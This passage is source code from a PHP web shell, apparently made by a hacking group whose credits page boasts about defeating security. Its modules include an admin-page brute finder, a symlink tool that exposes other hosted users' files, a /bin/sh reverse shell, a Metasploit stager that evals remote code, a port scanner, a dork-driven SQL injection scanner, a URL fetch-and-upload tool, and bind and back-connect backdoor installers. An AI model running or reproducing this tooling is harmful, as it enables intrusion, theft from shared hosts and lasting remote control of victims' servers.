<form action="?y=<?php echo $pwd; ?>&amp;x=adfin" method="post">

<?php
    set_time_limit(0);
    error_reporting(0);
    $list['front'] = 'admin
adm
admincp
admcp
cp
modcp
moderatorcp
adminare
admins
cpanel
controlpanel';
    $list['end'] = 'admin1.php
admin1.html
admin2.php
admin2.html
yonetim.php
yonetim.html
yonetici.php
yonetici.html
ccms/
ccms/login.php
ccms/index.php
maintenance/
webmaster/
adm/
configuration/
configure/
websvn/
admin/
admin/account.php
admin/account.html
admin/index.php
admin/index.html
admin/login.php
admin/login.html
admin/home.php
admin/controlpanel.html
admin/controlpanel.php
admin.php
admin.html
admin/cp.php
admin/cp.html
cp.php
cp.html
administrator/
administrator/index.html
administrator/index.php
administrator/login.html
administrator/login.php
administrator/account.html
administrator/account.php
administrator.php
administrator.html
login.php
login.html
modelsearch/login.php
moderator.php
moderator.html
moderator/login.php
moderator/login.html
moderator/admin.php
moderator/admin.html
moderator/
account.php
account.html
controlpanel/
controlpanel.php
controlpanel.html
admincontrol.php
admincontrol.html
adminpanel.php
adminpanel.html
admin1.asp
admin2.asp
yonetim.asp
yonetici.asp
admin/account.asp
admin/index.asp
admin/login.asp
admin/home.asp
admin/controlpanel.asp
admin.asp
admin/cp.asp
cp.asp
administrator/index.asp
administrator/login.asp
administrator/account.asp
administrator.asp
login.asp
modelsearch/login.asp
moderator.asp
moderator/login.asp
moderator/admin.asp
account.asp
controlpanel.asp
admincontrol.asp
adminpanel.asp
fileadmin/
fileadmin.php
fileadmin.asp
fileadmin.html
administration/
administration.php
administration.html
sysadmin.php
sysadmin.html
phpmyadmin/
myadmin/
sysadmin.asp
sysadmin/
ur-admin.asp
ur-admin.php
ur-admin.html
ur-admin/
Server.php
Server.html
Server.asp
Server/
wp-admin/
administr8.php
administr8.html
administr8/
administr8.asp
webadmin/
webadmin.php
webadmin.asp
webadmin.html
administratie/
admins/
admins.php
admins.asp
admins.html
administrivia/
Database_Administration/
WebAdmin/
useradmin/
sysadmins/
admin1/
system-administration/
administrators/
pgadmin/
directadmin/
staradmin/
ServerAdministrator/
SysAdmin/
administer/
LiveUser_Admin/
sys-admin/
typo3/
panel/
cpanel/
cPanel/
cpanel_file/
platz_login/
rcLogin/
blogindex/
formslogin/
autologin/
support_login/
meta_login/
manuallogin/
simpleLogin/
loginflat/
utility_login/
showlogin/
memlogin/
members/
login-#428bcairect/
sub-login/
wp-login/
login1/
dir-login/
login_db/
xlogin/
smblogin/
customer_login/
UserLogin/
login-us/
acct_login/
admin_area/
bigadmin/
project-admins/
phppgadmin/
pureadmin/
sql-admin/
radmind/
openvpnadmin/
wizmysqladmin/
vadmind/
ezsqliteadmin/
hpwebjetadmin/
newsadmin/
adminpro/
Lotus_Domino_Admin/
bbadmin/
vmailadmin/
Indy_admin/
ccp14admin/
irc-macadmin/
banneradmin/
sshadmin/
phpldapadmin/
macadmin/
administratoraccounts/
admin4_account/
admin4_colon/
radmind-1/
Super-Admin/
AdminTools/
cmsadmin/
SysAdmin2/
globes_admin/
cadmins/
phpSQLiteAdmin/
navSiteAdmin/
server_admin_small/
logo_sysadmin/
server/
database_administration/
power_user/
system_administration/
ss_vms_admin_sm/
adminarea/
bb-admin/
adminLogin/
panel-administracion/
instadmin/
memberadmin/
administratorlogin/
admin/admin.php
admin_area/admin.php
admin_area/login.php
siteadmin/login.php
siteadmin/index.php
siteadmin/login.html
admin/admin.html
admin_area/index.php
bb-admin/index.php
bb-admin/login.php
bb-admin/admin.php
admin_area/login.html
admin_area/index.html
admincp/index.asp
admincp/login.asp
admincp/index.html
webadmin/index.html
webadmin/admin.html
webadmin/login.html
admin/admin_login.html
admin_login.html
panel-administracion/login.html
nsw/admin/login.php
webadmin/login.php
admin/admin_login.php
admin_login.php
admin_area/admin.html
pages/admin/admin-login.php
admin/admin-login.php
admin-login.php
bb-admin/index.html
bb-admin/login.html
bb-admin/admin.html
admin/home.html
pages/admin/admin-login.html
admin/admin-login.html
admin-login.html
admin/adminLogin.html
adminLogin.html
home.html
rcjakar/admin/login.php
adminarea/index.html
adminarea/admin.html
webadmin/index.php
webadmin/admin.php
user.html
modelsearch/login.html
adminarea/login.html
panel-administracion/index.html
panel-administracion/admin.html
modelsearch/index.html
modelsearch/admin.html
admincontrol/login.html
adm/index.html
adm.html
user.php
panel-administracion/login.php
wp-login.php
adminLogin.php
admin/adminLogin.php
home.php
adminarea/index.php
adminarea/admin.php
adminarea/login.php
panel-administracion/index.php
panel-administracion/admin.php
modelsearch/index.php
modelsearch/admin.php
admincontrol/login.php
adm/admloginuser.php
admloginuser.php
admin2/login.php
admin2/index.php
adm/index.php
adm.php
affiliate.php
adm_auth.php
memberadmin.php
administratorlogin.php
admin/admin.asp
admin_area/admin.asp
admin_area/login.asp
admin_area/index.asp
bb-admin/index.asp
bb-admin/login.asp
bb-admin/admin.asp
pages/admin/admin-login.asp
admin/admin-login.asp
admin-login.asp
user.asp
webadmin/index.asp
webadmin/admin.asp
webadmin/login.asp
admin/admin_login.asp
admin_login.asp
panel-administracion/login.asp
adminLogin.asp
admin/adminLogin.asp
home.asp
adminarea/index.asp
adminarea/admin.asp
adminarea/login.asp
panel-administracion/index.asp
panel-administracion/admin.asp
modelsearch/index.asp
modelsearch/admin.asp
admincontrol/login.asp
adm/admloginuser.asp
admloginuser.asp
admin2/login.asp
admin2/index.asp
adm/index.asp
adm.asp
affiliate.asp
adm_auth.asp
memberadmin.asp
administratorlogin.asp
siteadmin/login.asp
siteadmin/index.asp
ADMIN/
paneldecontrol/
login/
cms/
admon/
ADMON/
administrador/
ADMIN/login.php
panelc/
ADMIN/login.html';
    function template()
    {
        echo '

<script type="text/javascript">
<!--
function insertcode($text, $place, $replace)
{
    var $this = $text;
    var logbox = document.getElementById($place);
    if($replace == 0)
        document.getElementById($place).innerHTML = logbox.innerHTML+$this;
    else
        document.getElementById($place).innerHTML = $this;
//document.getElementById("helpbox").innerHTML = $this;
}
-->
</script>
<br>
<br>
<h1 class="technique-two">
       


</h1>

<div class="wrapper">
<div class="#428bca">
<div class="tube">
<center><table class="tabnet"><th colspan="2">Admin Finder</th><tr><td>
<form action="" method="post" name="xploit_form">

<tr>
<tr>
	<b><td>URL</td>
	<td><input class="inputz" type="text" name="xploit_url" value="' . $_POST['xploit_url'] . '" style="width: 350px;" />
	</td>
</tr><tr>
	<td>404 string</td>
	<td><input class="inputz" type="text" name="xploit_404string" value="' . $_POST['xploit_404string'] . '" style="width: 350px;" />
	</td></b>
</tr><br><td>
<span style="float: center;"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
</span></td></tr>
</form></td></tr>
<br /></table>
</div> <!-- /tube -->
</div> <!-- /#428bca -->
<br />
<div class="green">
<div class="tube" id="rightcol">
Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
<b>Found ones:<br /></b>
</div> <!-- /tube -->
</div></center><!-- /green -->
<br clear="all" /><br />
<div class="blue">
<div class="tube" id="logbox">
<br />
<br />
Admin page Finder :<br /><br />
</div> <!-- /tube -->
</div> <!-- /blue -->
</div> <!-- /wrapper -->
<br clear="all"><br>';
    }
    function show($msg, $br = 1, $stop = 0, $place = 'logbox', $replace = 0)
    {
        if (1 == $br) {
            $msg .= '<br />';
        }
        echo "<script type=\"text/javascript\">insertcode('" . $msg . "', '" . $place . "', '" . $replace . "');</script>";
        if (1 == $stop) {
            exit;
        }
        @flush();
        @ob_flush();
    }
    function check($x, $front = 0)
    {
        global $_POST, $site, $false;
        if (0 == $front) {
            $t = $site . $x;
        } else {
            $t = 'http://' . $x . '.' . $site . '/';
        }
        $headers = get_headers($t);
        if (!eregi('200', $headers[0])) {
            return 0;
        }
        $data = @file_get_contents($t);
        if ('' == $_POST['xploit_404string']) {
            if ($data == $false) {
                return 0;
            }
        }
        if ('' != $_POST['xploit_404string']) {
            if (strpos($data, $_POST['xploit_404string'])) {
                return 0;
            }
        }

        return 1;
    }
    // --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    template();
    if (!isset($_POST['xploit_url'])) {
        die;
    }
    if ('' == $_POST['xploit_url']) {
        die;
    }
    $site = $_POST['xploit_url'];
    if ('/' != $site[strlen($site) - 1]) {
        $site .= '/';
    }
    if ('' == $_POST['xploit_404string']) {
        $false = @file_get_contents($site . 'd65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html');
    }
    $list['end'] = str_replace('
', '', $list['end']);
    $list['front'] = str_replace('
', '', $list['front']);
    $pathes = explode('
', $list['end']);
    $frontpathes = explode('
', $list['front']);
    show(count($pathes) + count($frontpathes), 1, 0, 'total', 1);
    $verificate = 0;
    foreach ($pathes as $path) {
        show('Checking ' . $site . $path . ' : ', 0, 0, 'logbox', 0);
        ++$verificate;
        show($verificate, 0, 0, 'verified', 1);
        if (0 == check($path)) {
            show('not found', 1, 0, 'logbox', 0);
        } else {
            show('<span style="color: #428bca;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
            show('<a href="' . $site . $path . '">' . $site . $path . '</a>', 1, 0, 'rightcol', 0);
        }
    }
    preg_match("/\/\/(.*?)\//i", $site, $xx);
    $site = $xx[1];
    if ('www' == substr($site, 0, 3)) {
        $site = substr($site, 4);
    }
    foreach ($frontpathes as $frontpath) {
        show('Checking http://' . $frontpath . '.' . $site . '/ : ', 0, 0, 'logbox', 0);
        ++$verificate;
        show($verificate, 0, 0, 'verified', 1);
        if (0 == check($frontpath, 1)) {
            show('not found', 1, 0, 'logbox', 0);
        } else {
            show('<span style="color: #428bca;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
            show('<a href="http://' . $frontpath . '.' . $site . '/">' . $frontpath . '.' . $site . '</a>', 1, 0, 'rightcol', 0);
        }
    }
}
//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('dos' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=dos" method="post">
<center><br><br><br>
</center>

</form>
</center>
<?php
    /////FUNCTIONS
} elseif (isset($_GET['x']) && ('symlink' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post">

<?php
    @set_time_limit(0);
    echo '<br><br><center><h1>+--=[ Symlink ]=--+</h1></center><br><br><center><div class=content>';
    @mkdir('sym', 0777);
    $htaccess = 'Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any';
    $write = @fopen('sym/.htaccess', 'w');
    fwrite($write, $htaccess);
    @symlink('/', 'sym/root');
    $filelocation = basename(__FILE__);
    $read_named_conf = @file('/etc/named.conf');
    if (!$read_named_conf) {
        echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
    } else {
        echo "<br><br><div class='tmp'><table border='1' bordercolor='#428bca' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
        foreach ($read_named_conf as $subject) {
            if (eregi('zone', $subject)) {
                preg_match_all('#zone "(.*)"#', $subject, $string);
                flush();
                if (strlen(trim($string[1][0])) > 2) {
                    $UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
                    $name = $UID['name'];
                    @symlink('/', 'sym/root');
                    $name = $string[1][0];
                    $iran = '\.ir';
                    $israel = '\.il';
                    $indo = '\.id';
                    $sg12 = '\.sg';
                    $edu = '\.edu';
                    $gov = '\.gov';
                    $gose = '\.go';
                    $gober = '\.gob';
                    $mil1 = '\.mil';
                    $mil2 = '\.mi';
                    $malay = '\.my';
                    $china = '\.cn';
                    $japan = '\.jp';
                    $austr = '\.au';
                    $porn = '\.xxx';
                    $as = '\.uk';
                    $calfn = '\.ca';
                    if (eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0]) or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0]) or eregi("$malay", $string[1][0]) or eregi("$china", $string[1][0]) or eregi("$japan", $string[1][0]) or eregi("$austr", $string[1][0]) or eregi("$porn", $string[1][0]) or eregi("$as", $string[1][0]) or eregi("$calfn", $string[1][0])) {
                        $name = "<div style=' color: #428bca ; text-shadow: 0px 0px 1px #428bca; '>" . $string[1][0] . '</div>';
                    }
                    echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www." . $string[1][0] . '/>' . $name . ' </a> </div>
</td>

<td>
' . $UID['name'] . "
</td>

<td>
<a href='sym/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
                    flush();
                }
            }
        }
    }
    echo '</center></table>';
} elseif (isset($_GET['x']) && ('domain' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=domain" method="post">

<?php
    echo '<br><br><center><h1>+--=[ local domain viewer ]=--+</h1></center><br><br><div class=content>';
    $file = @implode(@file('/etc/named.conf'));
    if (!$file) {
        die("# can't ReaD -> [ /etc/named.conf ]");
    }
    preg_match_all('#named/(.*?).db#', $file, $r);
    $domains = array_unique($r[1]);
    //check();
    //if(isset($_GET['ShowAll']))

    echo '<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>[+] There are : [ <b>' . count($domains) . '</b> ] Domain</td></tr>
<tr><td>Domain</td><td>User</td></tr>';
    foreach ($domains as $domain) {
        $user = posix_getpwuid(@fileowner('/etc/valiases/' . $domain));
        echo "<tr><td>$domain</td><td>" . $user['name'] . '</td></tr>';
    }
    echo '</table>';

    echo '</div>';
}
//////////////////////////////////////////////////////
/////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('tool' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=tool" method="post">
<?php
    error_reporting(0);
    function ss($t)
    {
        if (!get_magic_quotes_gpc()) {
            return trim(urldecode($t));
        }

        return trim(urldecode(stripslashes($t)));
    }
    $s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);
    $rsport = '443';
    $rsportb4 = $rsport;
    $rstarget4 = $s_my_ip;
    $s_result = "<br><br><br><center><table><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='tool'><table class='tabnet'><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='" . $rstarget4 . "' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='" . $rsportb4 . "' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='" . $pwd . "' /></form></td><td><hr color='#4C83AF'><td><td><form method='POST'><table class='tabnet'><h2>Metasploit Connection </h2><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='" . $my_ip . "' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center></table><br><br />";
    echo $s_result;
    if ($_POST['metaConnect']) {
        $ipaddr = $_POST['yip'];
        $port = $_POST['yport'];
        if ('' == $ip && '' == $port) {
            echo 'fill in the blanks';
        } else {
            if (false !== strpos($ipaddr, ':')) {
                $ipaddr = '[' . $ipaddr . ']';
            }
            if (is_callable('stream_socket_client')) {
                $msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");
                if (!$msgsock) {
                    die();
                }
                $msgsock_type = 'stream';
            } elseif (is_callable('fsockopen')) {
                $msgsock = fsockopen($ipaddr, $port);
                if (!$msgsock) {
                    die();
                }
                $msgsock_type = 'stream';
            } elseif (is_callable('socket_create')) {
                $msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                $res = socket_connect($msgsock, $ipaddr, $port);
                if (!$res) {
                    die();
                }
                $msgsock_type = 'socket';
            } else {
                die();
            }
            switch ($msgsock_type) {
                case 'stream':
                    $len = fread($msgsock, 4);
                break;
                case 'socket':
                    $len = socket_read($msgsock, 4);
                break;
            }
            if (!$len) {
                die();
            }
            $a = unpack('Nlen', $len);
            $len = $a['len'];
            $buffer = '';
            while (strlen($buffer) < $len) {
                switch ($msgsock_type) {
                    case 'stream':
                        $buffer .= fread($msgsock, $len - strlen($buffer));
                    break;
                    case 'socket':
                        $buffer .= socket_read($msgsock, $len - strlen($buffer));
                    break;
                }
            }
            eval($buffer);
            echo '[*] Connection Terminated';
            die();
        }
    }
    if (isset($_REQUEST['sqlportb4'])) {
        $rsportb4 = ss($_REQUEST['sqlportb4']);
    }
    if (isset($_REQUEST['rstarget4'])) {
        $rstarget4 = ss($_REQUEST['rstarget4']);
    }
    if ($_POST['xback_php']) {
        $ip = $rstarget4;
        $port = $rsportb4;
        $chunk_size = 1337;
        $write_a = null;
        $error_a = null;
        $shell = '/bin/sh';
        $daemon = 0;
        $debug = 0;
        if (function_exists('pcntl_fork')) {
            $pid = pcntl_fork();
            if (-1 == $pid) {
                exit(1);
            }
            if ($pid) {
                exit(0);
            }
            if (-1 == posix_setsid()) {
                exit(1);
            }
            $daemon = 1;
        }
        umask(0);
        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock) {
            exit(1);
        }
        $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = proc_open($shell, $descriptorspec, $pipes);
        if (!is_resource($process)) {
            exit(1);
        }
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);
        while (1) {
            if (feof($sock)) {
                break;
            }
            if (feof($pipes[1])) {
                break;
            }
            $read_a = [$sock, $pipes[1], $pipes[2]];
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
            if (in_array($sock, $read_a)) {
                $input = fread($sock, $chunk_size);
                fwrite($pipes[0], $input);
            }
            if (in_array($pipes[1], $read_a)) {
                $input = fread($pipes[1], $chunk_size);
                fwrite($sock, $input);
            }
            if (in_array($pipes[2], $read_a)) {
                $input = fread($pipes[2], $chunk_size);
                fwrite($sock, $input);
            }
        }
        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        $rsres = ' ';
        $s_result .= $rsres;
    }
}
////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('whois' == $_GET['x'])) {
    ?>
   <form action="?y=<?php echo $pwd; ?>&x=whois" method="post">
   <?php
    @set_time_limit(0);
    @error_reporting(0);
    function sws_domain_info($site)
    {
        $getip = @file_get_contents("http://networktools.nl/whois/$site");
        flush();
        $ip = @findit($getip, '<pre>', '</pre>');

        return $ip;
        flush();
    }
    function sws_net_info($site)
    {
        $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
        $ip = @findit($getip, '<pre>', '</pre>');

        return $ip;
        flush();
    }
    function sws_site_ser($site)
    {
        $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
        $ip = @findit($getip, '<pre>', '</pre>');

        return $ip;
        flush();
    }
    function sws_sup_dom($site)
    {
        $getip = @file_get_contents('http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=' . $site . '&Search+subdomains=Find+subdomains');
        $ip = @findit($getip, '<strong>Nameservers found:</strong>', '<script type="text/javascript">');

        return $ip;
        flush();
    }
    function sws_port_scan($ip)
    {
        $list_post = ['80', '21', '22', '2082', '25', '53', '110', '443', '143'];
        foreach ($list_post as $o_port) {
            $connect = @fsockopen($ip, $o_port, $errno, $errstr, 5);
            if ($connect) {
                echo " $ip : $o_port ??? <u style=\"color: #428bca\">Open</u> <br /><br />";
                flush();
            }
        }
    }
    function findit($mytext, $starttag, $endtag)
    {
        $posLeft = @stripos($mytext, $starttag) + strlen($starttag);
        $posRight = @stripos($mytext, $endtag, $posLeft + 1);

        return @substr($mytext, $posLeft, $posRight - $posLeft);
        flush();
    }
    echo '<br><br><center>';
    echo '
    <br />
    <div class="sc"><form method="post"><table class="tabnet">
	<tr><th colspan="5">Website Whois</th></tr>
    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:#428bca;background-color:#000000" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:#428bca;background-color:#000000" name="scan" value="Scan !" /></td></tr>
    </table></form></div>';
    if (isset($_POST['scan'])) {
        $site = @htmlentities($_POST['site']);
        if (empty($site)) {
            die('<br /><br /> Not add IP .. !');
        }
        $ip_port = @gethostbyname($site);
        echo "
   <br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>
   <div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class=\"ru\"> <br /><br /><pre>
   ";
        echo '' . sws_port_scan($ip_port) . ' </pre></div> ';
        flush();
        echo '<div class="tit"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class="ru">
   <pre>' . sws_domain_info($site) . '</pre></div>';
        flush();
        echo '
   <div class="tit"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class="ru">
   <pre>' . sws_net_info($site) . '</pre> </div>';
        flush();
        echo '<div class="tit"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class="ru">
   <pre>' . sws_sup_dom($site) . '</pre> </div>';
        flush();
        echo '<div class="tit"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class="ru">
   <pre>' . sws_site_ser($site) . '</pre> </div>
   <div class="tit"> <br /><br />|-------------- END ------------------| <br /></div>';
        flush();
    }
    echo '</center>';
}
///////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('about' == $_GET['x'])) {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=about" method="post">
	<center><br><html>
<head>
<iframe width="1" height="1" src="http://www.youtube.com/embed/sf6LD2B_kDQ?rel=0&autoplay=1&loop=1&playlist=1V5NPUiOVvg" frameborder="0" allowfullscreen></iframe>
</head>
<body>
	<a href="https://www.facebook.com/OfficialBloodSecHackers.gov" target="_blank" ><img src="http://cs.i-services.com.hk/system/templates_c/vifocj.jpg" width="20%"></a>
	
	<p>	<span style="color:#ffffff;font-family:Abel;font-size:20;"><b>The world's leaders enjoyed their Luxurious pleasure but their money is your Cost.<br>
	<br><br>[Contributors]<br><br>
	Darkjin . . . . . Shell Programmer/CEO|Founder of BSH<br>
	Smurfie . . . . . Shell Programmer/CEO of BSH<br>
	NeoZone . . . . . Shell WebDesigner/CEO of BSH<br>
	<br>
    <br>~Laughing at your security since 2012~ </span>
		<p>	<span style="color:#ffffff;font-family:Abel;font-size:20;">Official Members:</b></Span></p>
		<br>
<table align=center border="0">
<tr>
<td width=100% id=greetz>
<marquee behavior="scroll" direction="left" scrollamount="4" scrolldelay="55" width="100%">
<font size="5px" style="font-family: Iceberg, sans-serif;color:black;text-shadow: 0 0 3px red, 0px 0px 5px red" >
<b>-=| D4rkj1n - 2R4T$ - Smurfie - NeoZone - PH.Gamer[R] - 1nt0x1c4t3d - LittleDevilzUsagi - Syntax Error - NewbiexHacker - CyberGhost - NoiseOne - m4st3rb4nd01 - Crow - sKyle - AnoaGhost - Yamiko - SilentAngel - 1nuT1L - 1337 and to all official members of bsh :) |=-</font>
</marquee>
</td>
</table>
<br><br>

</html>


<?php
}
//////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('sqli-scanner' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=sqli-scanner" method="post">

<?php
    echo '<br><br><center><form method="post" action=""><b><font color="green">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:#428bca;background-color:#000000" size="20"/><input class="inputzbut" type="submit" style="color:#428bca;background-color:#000000" name="scan" value="Scan"></form></center>';
    ob_start();
    set_time_limit(0);
    if (isset($_POST['scan'])) {
        $browser = $_SERVER['HTTP_USER_AGENT'];
        $first = 'startgoogle.startpagina.nl/index.php?q=';
        $sec = '&start=';
        $reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';
        for ($id = 0; $id <= 30; ++$id) {
            $page = $id * 10;
            $dork = urlencode($_POST['dork']);
            $url = $first . $dork . $sec . $page;
            $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_USERAGENT, '$browser)');
            $result = curl_exec($curl);
            curl_close($curl);
            preg_match_all($reg, $result, $matches);
        }
        foreach ($matches[1] as $site) {
            $url = preg_replace('/=/', "='", $site);
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_USERAGENT, '$browser)');
            curl_setopt($curl, CURLOPT_TIMEOUT, '5');
            $GET = curl_exec($curl);
            if (preg_match('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i', $GET)) {
                echo '<center><b><font color="#E10000">Found : </font><a href="' . $url . '" target="_blank">' . $url . '</a><font color=#428bca> &#60;-- SQLI Vuln 

Found..</font></b></center>';
                ob_flush();
                flush();
            } else {
                echo '<center><font color="#FFFFFF"><b>' . $url . '</b></font><font color="#0FFF16"> &#60;-- Not Vuln</font></center>';
                ob_flush();
                flush();
            }
            ob_flush();
            flush();
        }
        ob_flush();
        flush();
    }
    ob_flush();
    flush();
} elseif (isset($_GET['x']) && ('apa' == $_GET['x'])) {
    if (isset($_POST['uploadcomp'])) {
        if (is_uploaded_file($_FILES['file']['tmp_name'])) {
            $path = magicboom($_POST['path']);
            $fname = $_FILES['file']['name'];
            $tmp_name = $_FILES['file']['tmp_name'];
            $pindah = $path . $fname;
            $stat = @move_uploaded_file($tmp_name, $pindah);
            if ($stat) {
                $msg = "file uploaded to $pindah";
            } else {
                $msg = "failed to upload $fname";
            }
        } else {
            $msg = "failed to upload $fname";
        }
    } elseif (isset($_POST['uploadurl'])) {
        $pilihan = trim($_POST['pilihan']);
        $wurl = trim($_POST['wurl']);
        $path = magicboom($_POST['path']);
        $namafile = download($pilihan, $wurl);
        $pindah = $path . $namafile;
        if (is_file($pindah)) {
            $msg = "file uploaded to $pindah";
        } else {
            $msg = "failed to upload $namafile";
        }
    } ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=apa" enctype="multipart/form-data" method="post">
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from computer</th></tr>
<tr><td colspan="2"><p style="text-align:center;"><input style="color:#000000;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
</tr>
</table></form>
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from url</th></tr>
<tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=apa">
<table><tr><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php
} elseif (isset($_GET['x']) && ('netsploit' == $_GET['x'])) {
        // bind connect with c
        if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ('C' == $_POST['use'])) {
            $port = trim($_POST['port']);
            $passwrd = trim($_POST['bind_pass']);
            tulis('bdc.c', $port_bind_bd_c);
            exe('gcc -o bdc bdc.c');
            exe('chmod 777 bdc');
            @unlink('bdc.c');
            exe('./bdc ' . $port . ' ' . $passwrd . ' &');
            $scan = exe('ps aux');
            if (eregi("./bdc $por", $scan)) {
                $msg = '<p>Process found running, backdoor setup successfully.</p>';
            } else {
                $msg = '<p>Process not found running, backdoor not setup successfully.</p>';
            }
        }
        // bind connect with perl
        elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ('Perl' == $_POST['use'])) {
            $port = trim($_POST['port']);
            $passwrd = trim($_POST['bind_pass']);
            tulis('bdp', $port_bind_bd_pl);
            exe('chmod 777 bdp');
            $p2 = which('perl');
            exe($p2 . ' bdp ' . $port . ' &');
            $scan = exe('ps aux');
            if (eregi("$p2 bdp $port", $scan)) {
                $msg = '<p>Process found running, backdoor setup successfully.</p>';
            } else {
                $msg = '<p>Process not found running, backdoor not setup successfully.</p>';
            }
        }
        // back connect with c
        elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ('C' == $_POST['use'])) {
            $ip = trim($_POST['ip']);
            $port = trim($_POST['backport']);
            tulis('bcc.c', $back_connect_c);
            exe('gcc -o bcc bcc.c');
            exe('chmod 777 bcc');
            @unlink('bcc.c');
            exe('./bcc ' . $ip . ' ' . $port . ' &');
